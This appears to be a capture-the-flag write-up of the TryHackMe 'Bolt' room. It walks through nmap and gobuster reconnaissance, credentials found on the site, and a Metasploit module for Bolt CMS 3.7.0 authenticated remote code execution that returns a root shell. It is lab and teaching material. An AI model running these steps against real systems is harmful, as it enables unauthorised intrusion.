# Bolt

## General information

<h3>Difficulty: <img src="https://img.shields.io/badge/F%C3%A1cil-green?style=flat-square"> </h3>

<h3> Operating system: Linux </h3> 

<h3> Vulnerability exploited: Remote Code Execution </h3>

<h3> Date of resolution: 05/07/2025 </h3>

<h3>Link Virtual Machine: <a href="https://tryhackme.com/room/bolt" target="_blank">Bolt</a></h3>

### *Read this document in espagnol:* <a href="bolt.md">Bolt</a>

## Recognition

TryHackme provides us with the target machine's IP address **target_ip**

I'm going to set the IP address of the target machine in the **/etc/hosts** file. I'm going to call it **bolt**

<p align="center"> 
<img src="images/hosts.png" width="600" alt="Resultado de Nmap">
</p>

### Ping

Depending on the result we can deduce whether it is a **Linux** or **Window** machine, for example:

```
ping -c 1 bolt
```

**Its ttl is 63, so it's Linux**

### Open Port Scanning

#### TCP Port Scanning

The command I use with nmap is:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn bolt
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service | Version                         |
| --------- | ------- | ------------------------------- |
| 80        | http    | Apache httpd 2.4.29             |
| 22        | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 8000      | http    | syn-ack ttl 63                  |

</div>

#### UDP port scanning

```
nmap -sU --top-ports 200 --min-rate=5000 -Pn bolt
```

**No open ports**

## Exploration

### Fuzzing web

```
gobuster dir -u http://bolt:8000/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
```

<p align="center"> 
<img src="images/gobuster.png" width="600" alt="Resultado de Nmap">
</p>

```
http://bolt:8000/
```

<p align="center"> 
<img src="images/bolt.png" width="600" alt="Resultado de Nmap">
</p>

```
http://bolt:8000/entries
```

<p align="center"> 
<img src="images/jake.png" width="600" alt="Resultado de Nmap">
</p>

We have so far:

**User**: bolt
**Password**: boltadmin123

Then, I think of searching in the browser how to log in with the Bolty CMS and the following appears:

```
http://bolt:8000/bolt/login
```

<p align="center"> 
<img src="images/login.png" width="600" alt="Resultado de Nmap">
</p>

I enter the credentials, and when I enter in the lower left corner I find the version that uses the bolt cms

<p align="center"> 
<img src="images/bolt2.png" width="600" alt="Resultado de Nmap">
</p>

Then, on the exploit database page in the search engine I search for bolt and the following appears:

<p align="center"> 
<img src="images/ed.png" width="600" alt="Resultado de Nmap">
</p>

Bolt CMS 3.7.0 - Authenticated Remote Code Execution, then once inside in the left corner we can find the exploit id.

<p align="center"> 
<img src="images/ed2.png" width="600" alt="Resultado de Nmap">
</p>

## Exploitation

In Metasploit we use the **search** command to search for any **bolt** vulnerability.

```
search bolt
```

<p align="center"> 
<img src="images/meta.png" width="600" alt="Resultado de Nmap">
</p>

```
use 0
show options
```

<p align="center"> 
<img src="images/meta2.png" width="600" alt="Resultado de Nmap">
</p>

```
set LHOST 10.2.139.36
set RHOST 10.10.136.240
set USERNAME bolt
set PASSWORD boltadmin123
show options
```

<p align="center"> 
<img src="images/meta3.png" width="600" alt="Resultado de Nmap">
</p>

```
run
```

<p align="center"> 
<img src="images/run.png" width="600" alt="Resultado de Nmap">
</p>

We are **root** lol

Then in the **/home** path

```
cat flag.txt
```

<p align="center"> 
<img src="images/cat.png" width="600" alt="Resultado de Nmap">
</p>

**Finished machine**

## Conclusion

This machine was very easy to use. Just by using **a good eye**, you'll find the username and password on the page. The only thing I struggled with was finding the **Bolt CMS login URL**. The machine also guides you a bit about which browser page to visit in **exploitdb**. The exploit then automates it with a Metasploit module. The escalation isn't necessary since you start as root, and finding the flag is very simple.